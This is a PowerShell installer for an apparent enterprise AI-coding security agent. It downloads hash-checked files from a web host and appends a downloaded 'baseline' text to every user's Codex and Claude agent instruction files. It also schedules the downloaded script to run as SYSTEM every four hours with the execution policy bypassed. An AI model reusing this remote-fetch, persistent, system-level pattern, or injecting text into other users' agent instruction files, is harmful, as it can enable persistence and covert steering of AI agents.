$ErrorActionPreference = 'Stop'
$baseUrl = 'https://sentinel-agent-security.yjiod2022.chatgpt.site/downloads'
$installDir = Join-Path $env:ProgramData 'SentinelAgent'
$reportDir = Join-Path $installDir 'reports'
$previousDir = Join-Path $installDir 'previous'
$stageDir = Join-Path $installDir ('.stage-' + [Guid]::NewGuid().ToString('N'))
$expected = @{ 'sentinel-policy.json'='431a156f48208bcbc2c44dd92f8b2383be6a04df9294631f6386a9a6d48ac64d'; 'sentinel-windows.ps1'='c1e1b9a9a024a7c84d9bd91816e8265bda342bb3f29006c48f5eb9de7ab11e4c'; 'sentinel-security-baseline.md'='0c0b6ac7e4bee2859f0d0e70b80a3865fd5fb4c68cf531fe555188a1b9e6d19c' }
New-Item -ItemType Directory -Force -Path $installDir,$reportDir,$previousDir,$stageDir | Out-Null
& icacls.exe $installDir /inheritance:r /grant:r '*S-1-5-18:(OI)(CI)F' '*S-1-5-32-544:(OI)(CI)F' /T /C | Out-Null
try {
  foreach ($name in $expected.Keys) { Invoke-WebRequest "$baseUrl/$name" -OutFile (Join-Path $stageDir $name) -UseBasicParsing }
  foreach ($name in $expected.Keys) { if ((Get-FileHash (Join-Path $stageDir $name) -Algorithm SHA256).Hash.ToLower() -ne $expected[$name]) { throw "Integrity verification failed: $name" } }
  $backupHashes=@{}
  foreach ($name in $expected.Keys) { $current=Join-Path $installDir $name; if(Test-Path $current){Copy-Item $current (Join-Path $previousDir $name) -Force; $backupHashes[$name]=(Get-FileHash $current -Algorithm SHA256).Hash.ToLower()} }
  if($backupHashes.Count -eq $expected.Count){$backupHashes|ConvertTo-Json|Set-Content (Join-Path $previousDir 'checksums.json') -Encoding UTF8}
  foreach ($name in $expected.Keys) { Move-Item (Join-Path $stageDir $name) (Join-Path $installDir $name) -Force }
} finally { Remove-Item $stageDir -Recurse -Force -ErrorAction SilentlyContinue }
$baseline = Get-Content (Join-Path $installDir 'sentinel-security-baseline.md') -Raw
Get-ChildItem 'C:\Users' -Directory | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | ForEach-Object {
  foreach ($target in @((Join-Path $_.FullName '.codex\AGENTS.md'),(Join-Path $_.FullName '.claude\CLAUDE.md'))) {
    New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null
    if (-not (Test-Path $target)) { Set-Content -Encoding UTF8 $target $baseline }
    elseif (-not (Select-String -Path $target -SimpleMatch '企业 AI Coding 安全基线' -Quiet)) { Add-Content -Encoding UTF8 $target "`n$baseline" }
  }
}
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$installDir\sentinel-windows.ps1`" -Output `"$reportDir\latest.json`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 4)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'Sentinel AI Agent Security Scan' -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
Write-Output 'Sentinel Agent installed and scheduled.'
